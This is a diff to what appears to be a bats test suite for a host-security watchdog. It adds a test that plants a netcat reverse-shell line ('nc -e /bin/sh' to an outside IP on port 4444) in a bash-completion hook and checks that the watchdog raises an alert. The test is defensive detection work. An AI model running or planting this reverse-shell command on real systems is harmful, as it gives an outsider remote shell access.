@@ -234,3 +234,16 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in bash-completion: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # dhclient-hooks nc reverse-shell variant INVARIANTs across
+    # the brain. Lock the netcat axis on per-bash-login source
+    # surface too.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/bash\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/mytool"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
